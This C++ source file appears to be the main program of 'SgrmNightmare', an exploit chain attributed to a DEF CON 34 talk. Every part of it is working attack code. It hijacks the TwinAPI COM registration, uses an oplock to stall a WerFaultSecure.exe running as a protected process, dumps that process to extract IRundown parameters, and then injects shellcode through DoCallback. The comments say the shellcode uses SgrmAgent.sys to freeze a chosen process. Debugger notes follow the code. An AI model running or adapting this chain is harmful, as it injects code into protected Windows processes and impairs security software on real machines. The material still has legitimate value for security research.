#include "StdAfx.h"
#include "SgrmFault.h"
#include "registry.h"
#include "com.h"
#include "utils.h"


// global vars 
HANDLE hEvent;
HANDLE hEncFile;
HANDLE hFile;

static
void
banner()
{
    wprintf(
        L"*******************************************************************************\n"
        L"*\tWerFaultSecure & SgrmAgent.sys Process Impairment Chain\n"
        L"*\tExploit chain presented at --> DEF CON 34 <--\n"
        L"*\tPresentation: {link to be updated}\n"
        L"*\tGitHub: https://www.github.com/lem0nSec/SgrmNightmare\n"
        L"*\tAngelo Frasca Caccia (lem0nSec_) & Alejandro Pinna (frodosobon)\n"
        L"*******************************************************************************\n\n");

    Sleep(1000);
}

static
void
usage()
{
    wprintf(
        L"\n"
        L" -h\t: Show this help message\n"
        L" -p\t: AppContainer Process ID\n"
        L" -t\t: Target process name (case sensitive)\n"
    );
}

// This function uses WerFaultSecure.exe from Windows 8.1 to
// create an unencrypted crash dump of a process.
static
BOOL
GenerateUnencryptedCrashDump(_In_ DWORD ProcessId, _In_ DWORD ThreadId) {
    BOOL status = FALSE;
    STARTUPINFOEXA StartupInfoExA = { sizeof(StartupInfoExA) };
    PROCESS_INFORMATION ProcessInfo = {};
    std::string cmdLine{};

    hFile = CreateFile(
        L".\\dump.dmp",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error creating file: dump.dmp\n");
        goto Exit;
    }

    hEncFile = CreateFile(
        L".\\dump_enc.dmp",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hEncFile == INVALID_HANDLE_VALUE) {
        printf("[-] Error creating file: dump_enc.dmp\n");
        goto Exit;
    }

    if (!SetHandleInformation(hFile, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Error setting inheritability on dump.dmp handle.\n");
        goto Exit;
    }

    if (!SetHandleInformation(hEncFile, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Error setting inheritability on dump_enc.dmp handle.\n");
        goto Exit;
    }

    hEvent = CreateEventW(nullptr, TRUE, FALSE, nullptr);
    if (!hEvent) {
        printf("[-] Error creating event.\n");
        goto Exit;
    }

    if (!SetHandleInformation(hEvent, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Error setting inheritability on event handle.\n");
        goto Exit;
    }

    cmdLine = ".\\werfaultsecure.exe /h /file " + std::to_string(HandleToUlong(hFile)) + " /pid "
        + std::to_string((int)ProcessId) + " /tid " + std::to_string(ThreadId) + " /type 2 " + "/encfile "
        + std::to_string(HandleToUlong(hEncFile))
        + " /cancel " + std::to_string(HandleToUlong(hEvent));
    status = CreateProcessAsPPL((LPSTR)cmdLine.c_str(), &StartupInfoExA, &ProcessInfo);
    if (!status) {
        printf("[-] Error creating WerFaultSecure.exe process as PPL : (0x % -04x)\n", GetLastError());
        goto Exit;
    }

    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

Exit:
    if (hEncFile) {
        CloseHandle(hEncFile);
    }
    if (hFile) {
        CloseHandle(hFile);
    }

    CloseHandle(ProcessInfo.hProcess);
    CloseHandle(ProcessInfo.hThread);

    return status;
}

// This function retrieves the data to 
// connect to the remote IRundown interface.
// Then prepares the shared section, connects
// to IRundown, and uses IRundown::DoCallback
// to inject and execute the shellcode in 
// WerFaultSecure.exe
static
BOOL
TriggerShellcodeExecution(
    _In_ PVOID pShellcode,
    _In_ DWORD dwShellcodeLength,
    _In_ PVOID pLocalSection,
    _In_ PVOID pPattern)
{
    // Shared section pointers
    WER_MAPPED_SECTION_PAYLOAD pLocalSectionMapping{};
    WER_MAPPED_SECTION_PAYLOAD pRemoteSectionMapping{};

    // IRundown data
    IR_PARAMETERS rundownParams{};
    XAptCallback params{};

    HMODULE hNtdll{};
    HMODULE hKernel32{};
    MODULE_SECTION_INFORMATION msInfo{};
    DWORD64 stackOffset = 0x1000 - 0x100; // Let's always keep the stack address 8-bit aligned
    PTRMEM pfnRtlCaptureContex = 0;
    PTRMEM pfnNtContinue = 0;
    DWORD64 pfnWriteProcessMemory = 0;

    if (!pLocalSection) {
        return 0;
    }

    hNtdll = GetModuleHandle(L"ntdll.dll");
    hKernel32 = GetModuleHandle(L"kernel32.dll");

    if (!ResolveModuleSectionBase(L"wer.dll", ".text", &msInfo)) {
        return 0;
    }

    if (!hNtdll ||
        !hKernel32 ||
        !msInfo.moduleBase) {
        return 0;
    }

    pfnRtlCaptureContex = (PTRMEM)GetProcAddress(hKernel32, "RtlCaptureContext");
    pfnNtContinue = (PTRMEM)GetProcAddress(hNtdll, "NtContinue");
    pfnWriteProcessMemory = (DWORD64)GetProcAddress(hKernel32, "WriteProcessMemory");
    if (!pfnRtlCaptureContex ||
        !pfnNtContinue ||
        !pfnWriteProcessMemory) {
        return 0;
    }

    if (!DumpInitializeUtils("dump.dmp")) {
        return 0;
    }

    if (!DumpGetIRundownParameters(&rundownParams)) {
        return 0;
    }

    printf("[+] IRundown parameters collected.\n");

    void* pRemoteSection{};
    if (!DumpGetRemoteSection(pPattern, /* truncating is safe here */ (ULONG)sizeof(RPC_CSTR), &pRemoteSection)) {
        return 0;
    }

    printf("[+] Remote section identified at 0x%-016p\n", pRemoteSection);

    IRundown* rndn{};
    rndn = (IRundown*)IRundownConnect(&rundownParams);
    if (!rndn) {
        printf("[-] Remote IRundown connection failed.\n");
        return 0;
    }

    printf("[+] IRundown connection successful: 0x%-016p\n", (void*)rndn);

    pLocalSectionMapping.sampleContext = (PCONTEXT)pLocalSection;
    pRemoteSectionMapping.sampleContext = (PCONTEXT)pRemoteSection;

    pLocalSectionMapping.shellcode = Add2Ptr(pLocalSection, sizeof(CONTEXT));
    pRemoteSectionMapping.shellcode = Add2Ptr(pRemoteSection, sizeof(CONTEXT));

    pLocalSectionMapping.stack = Add2Ptr(pLocalSection, stackOffset);
    pRemoteSectionMapping.stack = Add2Ptr(pRemoteSection, stackOffset);

    __try {

        pLocalSectionMapping.sampleContext->ContextFlags = CONTEXT_FULL;

        params.guidProcessSecret = rundownParams.secretGUID;
        params.pServerCtx = (PTRMEM)rundownParams.pContext;

        // First DoCallback cycle - RtlCaptureContext
        // RtlCaptureContext(pRemoteSectionMapping.sampleContext)
        params.pfnCallback = pfnRtlCaptureContex;
        params.pParam = (PTRMEM)pRemoteSectionMapping.sampleContext;
        
        printf("[+] DoCallback 1.\n");
        
        HRESULT hr = rndn->DoCallback(&params);
        if (FAILED(hr)) {
            printf("[-] DoCallback error: (0x%x)\n", hr);
            __leave;
        }

        printf("[+] Sample _CONTEXT saved:\n\tRIP: 0x%-016p\n\tRSP: 0x%-016p\n\tRBP: 0x%-016p\n",
            (void*)pLocalSectionMapping.sampleContext->Rip,
            (void*)pLocalSectionMapping.sampleContext->Rsp,
            (void*)pLocalSectionMapping.sampleContext->Rbp);

        // Setting up WriteProcessMemory parameters in the _CONTEXT
        // Setting RIP to be WriteProcessMemory
        pLocalSectionMapping.sampleContext->Rip = pfnWriteProcessMemory;

        // Parameter 1 - Current process
        pLocalSectionMapping.sampleContext->Rcx = -1;

        // Parameter 2 - Destination address is wer.dll's base
        pLocalSectionMapping.sampleContext->Rdx = (DWORD64)msInfo.sectionBase;

        // Parameter 3 - Source is the shellcode
        // bringing actual shellcode to the shared section
        RtlCopyMemory(pLocalSectionMapping.shellcode, pShellcode, dwShellcodeLength);
        pLocalSectionMapping.sampleContext->R8 = (DWORD64)pRemoteSectionMapping.shellcode;

        // Parameter 4 - Size of the shellcode
        pLocalSectionMapping.sampleContext->R9 = dwShellcodeLength;

        // Parameter 5 (NULL) + return address
        // return address on the fake stack is wer's .text section
        memset(pLocalSectionMapping.stack, 0, 100);
        RtlCopyMemory(pLocalSectionMapping.stack, &msInfo.sectionBase, sizeof(PVOID));
        pLocalSectionMapping.sampleContext->Rsp = (DWORD64)pRemoteSectionMapping.stack;
        pLocalSectionMapping.sampleContext->Rbp = (DWORD64)pRemoteSectionMapping.stack;

        // Second DoCallback cycle - WriteProcessMemory
        // WriteProcessMemory(GetCurrentProcess(), WerTextBase, shellcode, sizeof(shellcode), NULL)
        params.pfnCallback = pfnNtContinue;

        printf("[+] DoCallback 2. Firing shellcode & waiting...\n");
        
        hr = rndn->DoCallback(&params);
        rndn->Release();

    }
    __except (GetExceptionCode()) {
        goto exit;
    }

exit:
    return TRUE;

}

int wmain(int argc, wchar_t* argv[])
{
    DWORD AppContainerProcessId = 0;
    const wchar_t* TargetProcessName = nullptr;

    if (argc < 2) {
        usage();
        return 0;
    }

    for (int i = 1; i < argc; ++i) {
        if (!wcscmp(argv[i], L"-h")) {
            usage();
            return 0;
        }
        else if (!wcscmp(argv[i], L"-p") && i + 1 < argc)
            AppContainerProcessId = wcstoul(argv[++i], nullptr, 0);
        else if (!wcscmp(argv[i], L"-t") && i + 1 < argc)
            TargetProcessName = argv[++i];
    }

    if (TargetProcessName == nullptr) {
        usage();
        return 0;
    }


    PVOID pShellcode = nullptr;
    DWORD dwShellcodeLength = 0;
    const wchar_t fileToLock[] = L"C:\\Windows\\System32\\license.rtf";
    const wchar_t STAData[] = L"Free";
    HANDLE hFile{};
    OVERLAPPED overlapped{};
    HANDLE hFileMap{};
    void* pLocalSharedSection = nullptr;
    PWER_MAPPED_SECTION_HEADER pSectionHeader = nullptr;
    DWORD processId = 0;
    DWORD value = 0;
    UUID Uuid{};
    char* randomGuid{};
    HANDLE hProcess{};
    std::string cmdLine{};
    STARTUPINFOEXA StartupInfo{};
    PROCESS_INFORMATION ProcessInfo{};
    DWORD dwBytes = 0;

    banner();

    if (!EnableCurrentProcessPrivilege(L"SeDebugPrivilege")) {
        printf("[-] Privilege error. Aborting...\n");
        return 0;
    }

    printf("[+] SeDebugPrivilege ok\n");

    // We create the shellcode for SgrmAgent.sys. This is
    // the payload that will be executed by WerFaultSecure.exe.
    // It is responsible for establishing a communication channel with
    // the driver, and freezing the process we specify below as first parameter.
    if (!AllocateSgrmShellcode(TargetProcessName, &pShellcode, &dwShellcodeLength) ||
        !pShellcode ||
        !dwShellcodeLength ||
        dwShellcodeLength < 0) {
        printf("[-] Error allocating SGRM shellcode\n");
        return 0;
    }

    printf("[+] SGRM Shellcode of size %d ready at 0x%-016p\n", dwShellcodeLength, pShellcode);

    // We change the ownership and permissions of HKLM\Software\Classes\CLSID\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\InProcServer32 to be able to modify it.
    if (!RegKeyChangeOwner(L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}")) {
        printf("[-] Error changing TwinAPI CLSID Reg Key owner.\n");
        return 0;
    }

    if (!RegKeyChangeOwner(L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32")) {
        printf("[-] Error changing TwinAPI CLSID InProcServer32 Reg Key owner.\n");
        return 0;
    }

    if (!RegKeyChangePermissions(L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32")) {
        printf("[-] Error changing TwinAPI Reg Key permissions\n");
        return 0;
    }

    if (!disableCFG()) {
        printf("Error disabling CFG\n");
        return 0;
    }

    // We change the value of InProcServer32\(Default) to point to the file C:\Windows\System32\license.rtf which we later oplocked.
    // So the COM server interface is initialized and locked at the right time.
    if (!RegKeySetValue(
        L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32",
        NULL,
        fileToLock,
        (DWORD)((wcslen(fileToLock) + 1) * sizeof(wchar_t)))) {
        printf("[-] Error setting TwinAPI InProcServer32 Default to target file.\n");
        return 0;
    }

    // We change the value of InProcServer32\ThreadingModel to 'Free' so the IRundown interface is initialized.
    if (!RegKeySetValue(
        L"Software\\Classes\\CLSID\\{07FC2B94-5285-417E-8AC3-C2CE5240B0FA}\\InProcServer32",
        L"ThreadingModel",
        STAData,
        (DWORD)((wcslen(STAData) + 1) * sizeof(wchar_t)))) {
        printf("[-] Error setting TwinAPI InProcServer32 Default to target file.\n");
        return 0;
    }

    hFile = SetOplockOnFile(fileToLock, &overlapped);
    if (!hFile) {
        printf("[-] Error setting oplock on %ws\n", fileToLock);
        return 0;
    }

    // We create a section object from our exploit process.
    // This section will later be shared with WerFaultSecure,
    // and it is where write parameters for DoCallback and shellcode
    hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, 0, 4096, nullptr);
    if (!hFileMap) {
        printf("[-] Error creating section.\n");
        return 0;
    }

    printf("[+] Section object created: 0x%lx\n", HandleToUlong(hFileMap));

    // We create a mapping view of the section. Once WerFaultSecure.exe also
    // maps it, anything that we write into the section from the exploit process
    // will be reflected into WerFaultSecure mapping view.
    pLocalSharedSection = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
    if (!pLocalSharedSection) {
        printf("[-] Error mapping section object.\n");
        goto Exit;
    }

    printf("[+] Section mapped in local process: 0x%-016p\n", pLocalSharedSection);

    // These values have been obtained by reversing faultrep!CCrashReport::LoadCrashData
    // The method checks the values written to the shared section, so if we don't specify these values, the exploit won't work.
    // The values come from the following binary:
    // faultrep.dll version 6.3.9600.17415 (winblue_r4.141028-1500)
    // Sha1 hash: B241A5B14F8A8E478B27CB79B7552F00AA01C538
    pSectionHeader = (PWER_MAPPED_SECTION_HEADER)pLocalSharedSection;
    processId = AppContainerProcessId;
    value = 0x00F8;

    //processId = FindProcessId(L"CalculatorApp.exe");
    if (!processId) {
        printf("[-] Error finding AppContainer process.\n");
        goto Exit;
    }

    printf("[+] AppContainer process: %d\n", processId);

    // We create a random GUID that enables us to find the shared section later in the WerFaultSecure dump
    // Ref. https://stackoverflow.com/questions/24365331/how-can-i-generate-uuid-in-c-without-using-boost-library
    if (UuidCreate(&Uuid) != RPC_S_OK) {
        printf("[-] Error generating tracking UUID.\n");
        goto Exit;
    }

    if (UuidToStringA(&Uuid, (RPC_CSTR*)&randomGuid) != RPC_S_OK) {
        printf("[-] Error generating tracking UUID.\n");
        goto Exit;
    }

    printf("[+] Random GUID generated: %s\n", randomGuid);

    // Setting up shared section with the required data...
    pSectionHeader->Unk = value;
    pSectionHeader->ProcessId = processId;
    RtlCopyMemory(&pSectionHeader->Cookie, randomGuid, sizeof(RPC_CSTR));
    for (unsigned int i = sizeof(WER_MAPPED_SECTION_HEADER); i < 4096; i++) {
        *(PBYTE)((PBYTE)pLocalSharedSection + i) = 0x41;
    }

    // Open inheritable handle to the AppContainer process.
    // This is just a random AppContainer process that's required to
    // lead WerFaultSecure to initialize COM and IRundown
    hProcess = OpenProcess(MAXIMUM_ALLOWED, TRUE, processId);
    if (hProcess == INVALID_HANDLE_VALUE || !hProcess) {
        printf("[-] Error opening AppContainer process: (0x%-04x)\n", GetLastError());
        goto Exit;
    }

    printf("[+] Opened inheritable handle to AppContainer process: 0x%lx\n", HandleToUlong(hProcess));

    // Copy the handle to the process to the shared section
    RtlCopyMemory(Add2Ptr(pLocalSharedSection, (0xc0 - sizeof(HANDLE))), &hProcess, 8);
    RtlSecureZeroMemory(Add2Ptr(pLocalSharedSection, 0xc0), 24);

    if (hFileMap == nullptr) {
        printf("[-] Section is null\n");
        goto Exit;
    }

    // Setting inheritability on the exploit's section object handle.
    // So WerFaultSecure will be able to use it.
    if (!SetHandleInformation(hFileMap, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
        printf("[-] Error setting inheritability on section handle.\n");
        goto Exit;
    }

    printf("[+] Section object is now inheritable.\n");

    // Create WerFaultSecure.exe process as PPL with the command line argument -s
    // -s is a handle to a section object that we want WerFaultSecure to map.
    cmdLine = ".\\werfaultsecure.exe -u -s " + std::to_string(HandleToUlong(hFileMap)) + " -p " + std::to_string(processId);
    StartupInfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    if (!CreateProcessAsPPL((LPSTR)cmdLine.c_str(), &StartupInfo, &ProcessInfo)) {
        printf("[-] Error creating WerFaultSecure.exe process as PPL: (0x%-04x)\n", GetLastError());
        goto Exit;
    }

    printf("[+] Spawned WerFaultSecure: %d - Waiting for overlapped result...\n", ProcessInfo.dwProcessId);

    // This call will halt the current thread until someone accesses the locked file.
    // We expect WerFaultSecure.exe to access 'C:\Windows\System32\license.rtf'.
    if (!GetOverlappedResult(hFile, &overlapped, &dwBytes, TRUE)) {
        printf("Oplock Failed. Aborting...\n");
        goto Exit;
    }

    printf("[+] Oplock fired! Dumping WerFaultSecure.exe...\n");

    // WerFaultSecure.exe here is stuck for as long as we hold the handle to license.rtf
    // At this point, IRundown is intitialized in the COM server, happy to serve requests :)
    // We first dump WerFaultSecure to get the required IRundown connection parameters from it.
    if (!GenerateUnencryptedCrashDump(ProcessInfo.dwProcessId, ProcessInfo.dwThreadId)) {
        goto Exit;
    }

    // We trigger the injection here...
    TriggerShellcodeExecution(
        pShellcode,                 // SGRM Shellcode
        dwShellcodeLength,          // Shellcode size
        pLocalSharedSection,        // Pointer to shared section in current process
        randomGuid);                // Pattern in the shared section. This is to locate 
    // the shared section in the dump of the remote WerFaultSecure

// We hold the lock to license.rtf as long as werfaultsecure.exe lives
// So we keep the COM server exposing th IRundown interface always alive
// We expect our own shellcode to call TerminateProcess() once finishes its job
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

    printf("[+] Complete.\n");

Exit:
    if (pLocalSharedSection) {
        UnmapViewOfFile(pLocalSharedSection);
    }
    if (hFile) {
        CloseHandle(hFile);
    }
    if (hEncFile) {
        CloseHandle(hEncFile);
    }
    if (hEvent) {
        CloseHandle(hEvent);
    }
    if (hFileMap) {
        CloseHandle(hFileMap);
    }
    if (ProcessInfo.hProcess) {
        CloseHandle(ProcessInfo.hProcess);
    }
    if (ProcessInfo.hThread) {
        CloseHandle(ProcessInfo.hThread);
    }
    if (hProcess) {
        CloseHandle(hProcess);
    }

    FreeSgrmShellcode();

    return 0;
}









/*0:000> dx -r1 (*((PPLInjection!tagSTDOBJREF *)0xd02e0fe918))
(*((PPLInjection!tagSTDOBJREF *)0xd02e0fe918))                 [Type: tagSTDOBJREF]
    [+0x000] flags            : 0x0 [Type: unsigned long]
    [+0x004] cPublicRefs      : 0x1 [Type: unsigned long]
    [+0x008] oxid             : 1327832766099251733 [Type: __int64]
    [+0x010] oid              : 0xcdf99d2bfb87d173 [Type: unsigned __int64]
    [+0x018] ipid             : {00005C00-1BDC-1EA4-DA7C-67557672B411} [Type: _GUID]
*/

/*
ntdll!TppAlpcpExecuteCallback+0x273
*/


/*
10 00000068`1fcff080 00007ff9`cd775f57     combase!ComInvokeWithLockAndIPID+0x57a [onecore\com\combase\dcomrem\channelb.cxx @ 2722]
11 00000068`1fcff300 00007ff9`cf4f3bb4     combase!ThreadInvoke+0xe17 [onecore\com\combase\dcomrem\channelb.cxx @ 7096]
12 00000068`1fcff530 00007ff9`cf4f2cbd     RPCRT4!DispatchToStubInCNoAvrf+0x24
13 00000068`1fcff580 00007ff9`cf4f37d4     RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1bd
14 00000068`1fcff650 00007ff9`cf4e10be     RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x154
15 00000068`1fcff6f0 00007ff9`cf4e1d35     RPCRT4!LRPC_SCALL::DispatchRequest+0x17e
16 00000068`1fcff7d0 00007ff9`cf4e521e     RPCRT4!LRPC_SCALL::HandleRequest+0x8d5
17 00000068`1fcff8e0 00007ff9`cf4e6ad8     RPCRT4!LRPC_ADDRESS::HandleRequest
*/


/*
0:004> dt OXIDEntry @rax
combase!OXIDEntry
   +0x000 _flink           : 0x0000023f`e849d9d8 CListElement
   +0x008 _blink           : (null)
   +0x010 _dwPid           : 0x1a00
   +0x014 _dwTid           : 0x128
   +0x018 _moxid           : _GUID {8e9a6674-3e5a-6ad5-dc14-59417a289970}
   +0x028 _mid             : 0x7099287a`415914dc
   +0x030 _ipidRundown     : _GUID {00004800-1a00-0128-896f-77d74c7e75de}
   +0x040 _dwFlags         : 0x4000203
   +0x048 _hServerSTA      : 0x00000000`001707aa HWND__
   +0x050 _pParentApt      : 0x0000023f`e8491cd0 CComApartment
   +0x058 _pSharedDefaultHandle : (null)
   +0x060 _pAuthId         : (null)
   +0x068 _pBinding        : (null)
   +0x070 _dwAuthnHint     : 1
   +0x074 _dwAuthnSvc      : 0xffffffff
   +0x078 _pMIDEntry       : 0x0000023f`e8492100 MIDEntry
   +0x080 _pRUSTA          : (null)
   +0x088 _cRefs           : 3
   +0x090 _hComplete       : (null)
   +0x098 _cCalls          : 0n0
   +0x09c _cResolverRef    : 0n0
   +0x0a0 _dwExpiredTime   : 0
   +0x0a4 _version         : tagCOMVERSION
   +0x0a8 _pAppContainerServerSecurityDescriptor : (null)
   +0x0b0 _ulMarshaledTargetInfoLength : 0
   +0x0b8 _marshaledTargetInfo : std::unique_ptr<unsigned char [0],DeleteMarshaledTargetInfo>
   +0x0c0 _pszServerPackageFullName : (null)
   =00007ff9`cd97fbd0 _palloc          : CPageAllocator
   +0x0c8 _guidProcessIdentifier : _GUID {36a61051-34f9-4296-b4b5-cdbf0a9e988f}
*/


/*
00007ff9`cd85b650 combase!CObjectContext::DoCallback (<function> *, void *, struct _GUID *, unsigned int)
00007ff9`cd74cb40 combase!CRemoteUnknown::DoCallback (struct tagXAptCallback *)

*/